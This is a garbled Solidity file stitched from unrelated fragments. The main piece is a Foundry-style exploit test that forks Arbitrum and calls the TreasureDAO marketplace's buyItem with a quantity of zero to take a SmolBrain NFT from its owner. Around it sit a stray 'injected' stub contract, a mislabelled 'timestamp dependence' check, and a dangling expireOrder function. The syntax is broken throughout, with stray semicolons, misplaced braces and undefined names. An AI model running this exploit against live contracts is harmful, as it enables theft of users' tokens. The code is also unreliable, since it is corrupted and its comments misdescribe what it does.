
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity 0.8.10;

;
;
contract ContractTest is DSTest {
  ITreasureMarketplaceBuyer itreasure =;
    ITreasureMarketplaceBuyer(0x812cdA2181ed7c45a35a691E0C85E231D218E273);
  IERC721 iSmolBrain = IERC721(0x6325439389E0797Ab35752B4F43a14C004f22A9c);
  uint256 tokenId = 3557;
  address nftOwner;
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("arbitrum", 7322694)};
  function testExploit() public {
    nftOwner = iSmolBrain.ownerOf(tokenId);
    emit log_named_address("Original NFT owner of SmolBrain:", nftOwner);
    uint256 timestampBefore = block.timestamp;
    itreasure.buyItem(0x6325439389E0797Ab35752B4F43a14C004f22A9c,
      3557,
      nftOwner,
      0,
      6969000000000000000000);
    uint256 timestampAfter = block.timestamp;
    require(timestampBefore == timestampAfter, "Timestamp Dependence Vulnerability");
    emit log_named_address("Exploit completed, NFT owner of SmolBrain:",
      iSmolBrain.ownerOf(tokenId))};
  function onERC721Received(address,
    address,
    uint256,
    bytes memory) public virtual returns (bytes4) {
    return this.onERC721Received.selector;};
function expireOrder() public {
    if (block.timestamp > orderExpiry) {
        cancelOrder()}